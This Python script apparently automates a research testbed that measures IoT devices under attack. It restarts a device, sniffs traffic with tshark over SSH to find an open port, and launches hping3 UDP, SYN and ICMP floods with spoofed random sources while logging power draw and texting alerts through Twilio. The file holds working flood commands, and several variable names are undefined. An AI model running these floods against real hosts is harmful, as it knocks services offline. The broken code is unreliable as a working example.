


# twillo python API messaging service to monitor automation script
def send_message(text,target_number1= os.environ.get('client_number')):
	
	account_sid = os.environ.get('account_sid')
	auth_token  = os.environ.get('auth_token')
	client = Client(account_sid, auth_token)

	message = client.messages \
		.create(
			body = text,
			from_ = os.environ.get('from_twillo_number'),
			to = target_number1
		 )
	print(message.sid)

# connect to sniffer using paramiko python ssh library 
def connect(sniffer_ip,sniffer_uname,sniffer_passwd):
	ssh = SSHClient()
	try:
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(sniffer_ip, port=22, username= sniffer_uname, password= sniffer_passwd)
	except:
		raise Exception('Failed to ssh')
	return ssh

# run command using paramiko on different components of testbed 
def execute(ssh,cmd):
	stdin, stdout, stderr = '','',''
	try:
		stdin, stdout, stderr = ssh.exec_command(cmd)
	except:
		raise Exception('Failed to Execute Command')



def Tshark_csv_port_save(attack_id,reading_id,ssh_sniffer):
	# Start tshark on sniffer to find port number to attack	
	cmd = 'timeout %d tshark -w %s%s%sstart%d.pcap -f "%s" -f "host %s" -i wlp58s0' \
			%(run_time,device_name,attack_name[attack_id],str(attack_rate),reading_id,attack_name[attack_id],device_ip)

	try:
		execute(ssh_sniffer,cmd) # execute function to run cmd on sniffer
		time.sleep(run_time) # wait till sniffer is collecting data, while IoT device restarts
	except Exception as e:
		send_message('Failed to execute command '+cmd)
		raise Exception(e)

	# convert the pcap file into csv	
	cmd = 'tshark -r %s%s%sstart%d.pcap -T fields -e ip.src \
	 		-e ip.dst -e _ws.col.Protocol -e %s.srcport -e %s.dstport -E header=y -E separator=,> %s' \
	 		%(device_name,attack_name[attack_id],str(attack_rate),reading_id,attack_name[attack_id], \
	 		attack_name[attack_id],csv_file_name)
	try:
		execute(ssh_sniffer,cmd)
	except Exception as e:
		send_message('Failed to execute command '+cmd)
		raise Exception(e)
	
	# wait for pcap  to csv conversio 
	time.sleep(convert_csv_time)
	
	# fetch the port number from local_fpath
	stdin, stdout, stderr = ssh_sniffer.exec_command('cat %s'%(csv_file_name))
	fp = open(local_fpath,'w+')
	fp.write(stdout.read())
	fp.close()
	df = None
	try:
		df = pd.read_csv(local_fpath,header=0,error_bad_lines=False)	
	except Exception as e:
		send_message('Failed to read csv file into pandas '+local_fpath)
		raise Exception(e)

	if attack_name[attack_id] == UDP:
		packet = 'DNS'
		vals = df[(df['ip.dst'] == device_ip) & (df['_ws.col.Protocol'] == packet)]['udp.dstport'].values
	else:
		packet = 'TCP'
		vals = df[(df['ip.dst'] == device_ip) & (df['_ws.col.Protocol'] == packet)]['tcp.dstport'].values 	
	
	port = -1
	for x_ in vals:
			try:
				port = int(x_) # port number to attack
				if port!=-1:
					break
			except:
				pass
	if port == -1:
		send_message('Warning! Port not found, retrying')
		cmd = enable_monitor_mode
		ssh_sniffer = connect(sniffer_ip, uname, passwd)
		try:
			execute(ssh_sniffer,cmd)
		except Exception as e:
			raise Exception(e)
		return None

	# Save the device, attack type, attack throughput, reading_id  and port number
	fp = open(portnumber_file,'a+')	  			# append to file
	fp.write(("%s\t%s\t\t\t%s\t\t\t%d\t\t%d\n") %(device_name,attack_name[attack_id], str(attack_rate),reading_id,port))
	fp.close()
	return port

# attack command on attacker

def hping_attack_command(payload,attack_duration,attack_port,hping_interval,device_ip):
	if payload == low:
		if attack_name[attack_id] == UDP:
			cmd = 'sudo timeout %d hping3 -d 1400 --udp -p %d --rand-source -i u%d %s'%(attack_duration,attack_port,hping_interval,device_ip)
		if attack_name[attack_id] == TCP:
			cmd = 'sudo timeout %d hping3 -d 1400 -S -p %d --rand-source -i u%d %s'%(attack_duration,attack_port,hping_interval,device_ip)
		if attack_name[attack_id] == ICMP:	
			cmd = 'sudo timeout %d hping3 -d 1400 --icmp --rand-source -i u%d %s'%(attack_duration,hping_interval,device_ip)
	
	else:
		if attack_name[attack_id] == UDP:
			cmd = 'sudo timeout %d hping3 --udp -p %d --rand-source -i u%d %s'%(attack_duration,attack_port,hping_interval,device_ip)
		if attack_name[attack_id] == TCP:
			cmd = 'sudo timeout %d hping3 -S -p %d --rand-source -i u%d %s'%(attack_duration,attack_port,hping_interval,device_ip)
		if attack_name[attack_id] == ICMP:	
			cmd = 'sudo timeout %d hping3 --icmp --rand-source -i u%d %s'%(attack_duration,hping_interval,device_ip)
	return cmd

def find_port_to_attack(attack_id,reading_id,ssh_sniffer):
	if attack_name[attack_id] == ICMP:
		attack_port = 1 
		time.sleep(run_time) # wait since ICMP don't have port number
	
	if attack_name[attack_id] == TCP:	
		attack_port   = Tshark_csv_port_save(attack_id,reading_id,ssh_sniffer) # find TCP port to attack

	if attack_name[attack_id] == UDP: 			
		attack_port   = Tshark_csv_port_save(attack_id,reading_id,ssh_sniffer) # find UDP port to attack

	return attack_port


def start_readings_eddos(hping_interval,attack_rate,attack_id,attack_name, reading_id,run_time, \
							intrim_wait,device_ip,payload):
	k=m
	while k< number_of_attacks:
		attack_port = None
		# restart device
		cmd = 'python ./scripts/usb_control.py switch:1 off'
		execute_single_cmd(cmd)
		cmd = 'python ./scripts/usb_control.py switch:1 on'
		execute_single_cmd(cmd)

		# wait for initilization of device
		time.sleep(intrim_wait)
		
		attack_port = find_port_to_attack(attack_id,reading_id,ssh_sniffer)

		if attack_port == None:
			continue
		k+=1

		

		# run tshark on sniffer
		# file name to store data on sniffer
		outFname = device_name+attack_name[attack_id]+str(attack_rate)+'out'+str(reading_id)+'.pcap'
		cmd1 = 'timeout %d tshark -w %s -i wlp58s0  "%s" and "host %s"'% \
				(attack_duration,outFname,attack_name[id],device_ip)

		
		# start power measurment on empiot
		# file name to store power data on empiot
		outFname = device_name+attack_name[attack_id]+str(attack_rate)+'p'+str(reading_id)+'.txt'	
		cmd2 = 'sudo ./empiot %s -t %d'%(outFname,attack_duration)

		
		cmd3 = hping_attack_command(payload,attack_duration,attack_port,hping_interval,device_ip)

		# run commands on sniffer, attacker and empiot simultaneously
		parallel_ssh_output	= parallelssh.run_command('%s', host_args=(cmd1,cmd2,cmd3))
		
		
		# check if all attacks are done
		if len(attack_name)-1 == attack_id: 
			attack_id = 0  
			reading_id = reading_id + 1
		else:
			attack_id = attack_id +1 # change attack
			
def start_readings_ddos(hping_interval,attack_rate,attack_id,attack_name, reading_id,run_time, \
							intrim_wait,device_ip,payload):
	k=m
	while k< number_of_attacks:
		attack_port = None
		# restart device
		cmd = 'python ./scripts/usb_control.py switch:1 off'
		execute_single_cmd(cmd)
		cmd = 'python ./scripts/usb_control.py switch:1 on'
		execute_single_cmd(cmd)

		# wait for initilization of device
		time.sleep(intrim_wait)
		
		attack_port = find_port_to_attack(attack_id,reading_id,ssh_sniffer)

		if attack_port == None:
			continue
		k+=1


		# tshark on sniffer	
		outFname = Device+attackName[id]+str(attack_pps)+'out'+str(ReadingId)+'.pcap'   # file name to store attack data on sniffer
		cmd1 = 'timeout %d tshark -w %s -f "%s" -f "host %s" -i wlp3s0'%(attack_duration,outFname,attack_name[attack_id],device_ip)

		# logging ap events
		cmd2 = ap_event_log
		
		cmd3 = hping_attack_command(payload,attack_duration,attack_port,hping_interval,device_ip)


		parallel_ssh_output	= parallelssh.run_command('%s', host_args=(cmd1,cmd2,cmd3))
		
		# check if all attacks are done
		if len(attack_name)-1== attack_id:
			attack_id = 0  
			reading_id = reading_id + 1
		else:
			attack_id = attack_id +1 
